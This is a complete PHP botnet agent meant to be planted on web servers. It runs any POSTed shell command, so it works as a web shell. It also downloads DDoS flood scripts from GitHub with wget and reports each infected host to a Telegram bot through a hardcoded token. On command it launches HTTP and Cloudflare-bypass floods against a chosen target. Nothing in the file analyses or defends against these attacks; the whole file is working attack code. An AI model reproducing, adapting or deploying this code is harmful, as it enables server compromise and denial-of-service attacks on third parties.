<?php  

if (!empty($_GET["ping"])){
	$currentPageUrl = $_SERVER["HTTP_HOST"];
	echo "bot: ", $currentPageUrl.$_SERVER["SCRIPT_NAME"], " | pong";
}

if (!empty($_GET["install"])){
    	$bot = $_SERVER["HTTP_HOST"].$_SERVER["SCRIPT_NAME"];
	shell_exec("wget -nc https://raw.githubusercontent.com/ServerSideProject/selica-php-botnet/main/methods/HTTP-RAW.js");
	shell_exec("wget -nc https://raw.githubusercontent.com/ServerSideProject/selica-php-botnet/main/methods/HTTP-RAND.js");
	shell_exec("wget -nc https://raw.githubusercontent.com/R00tS3c/DDOS-RootSec/master/DDOS%20Scripts/L7/CFSockets.js");
	shell_exec("wget -nc https://raw.githubusercontent.com/R00tS3c/DDOS-RootSec/master/DDOS%20Scripts/L7/CFBypass.js");
	shell_exec("wget -nc https://raw.githubusercontent.com/R00tS3c/DDOS-RootSec/master/DDOS%20Scripts/L7/uambypass.js");
	shell_exec("wget -nc https://raw.githubusercontent.com/R00tS3c/DDOS-RootSec/master/DDOS%20Scripts/L7/SLAYERSTRESS.COM%20LAYER7/HCAPTCHAv10%5BJS%5D/good.txt");
	file_get_contents("https://api.telegram.org/bot5397589274:AAFWAqxt_U5PbhN6KFHMRqat38lz3dhA6gM/sendMessage?chat_id=1159678884&text=http://".$bot);	
    echo("all methods has been downloaded");
}

if (!empty($_POST["cmd"])){
	$cmd = $_POST["cmd"];
	echo(shell_exec($cmd));
}


if (!empty($_POST["method"])){
	$method = $_POST["method"];

	if($method == "1"){     //http-raw
		$host = $_POST["host"];
		$time = $_POST["time"];
		echo("http-raw flood sent to $host $time");
		shell_exec("node HTTP-RAW.js $host $time");
	}

	if($method == "2"){     //http-rand
		$host = $_POST["host"];
		$time = $_POST["time"];
		echo("http-rand flood sent to $host $time");
		shell_exec("node HTTP-RAND.js $host $time");
	}

	if($method == "3"){     //CFSockets 
		$host = $_POST["host"];
		$time = $_POST["time"];
		echo("cfsockets flood sent to $host $time");
		shell_exec("node CFSockets.js $host $time");
	}

	if($method == "4"){     //CFBypass 
		$host = $_POST["host"];
		$time = $_POST["time"];
		echo("cfbypass flood sent to $host $time");
		shell_exec("node CFBypass.js $host $time");
	}	

	if($method == "5"){     //CFBypass 
		$host = $_POST["host"];
		$time = $_POST["time"];
		echo("uambypass flood sent to $host $time");
		shell_exec("node uambypass.js $host $time 60 250 good.txt 1");
	}		

}
else{
	if (!empty($_POST["stop"])){
		echo("all attacks has been stopped");
		shell_exec("pkill node && pkill python");
	}
}



?>
